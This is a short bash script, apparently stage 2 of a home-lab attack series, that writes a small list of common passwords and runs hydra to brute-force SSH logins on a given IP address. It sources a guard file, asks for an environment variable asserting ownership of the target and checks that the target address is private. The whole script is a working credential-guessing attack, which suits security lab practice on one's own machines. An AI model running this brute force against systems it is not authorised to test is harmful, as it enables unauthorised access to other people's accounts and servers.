#!/usr/bin/env bash
# Stage 2 - Initial access: SSH password guessing with a small wordlist against your own test VM.
# usage: NV_I_OWN_THIS_TARGET=yes ./02_bruteforce.sh 192.168.0.50 [user]
source "$(dirname "$0")/_guard.sh"; T="${1:?target ip}"; U="${2:-testuser}"; require_private "$T"
W="$(dirname "$0")/wordlist.txt"
[ -f "$W" ] || printf "123456\npassword\nadmin\nletmein\nqwerty\nwelcome\nsunshine\nmonkey\ndragon\nmaster\n" > "$W"
hydra -l "$U" -P "$W" -t 4 -W 2 -f "ssh://$T"
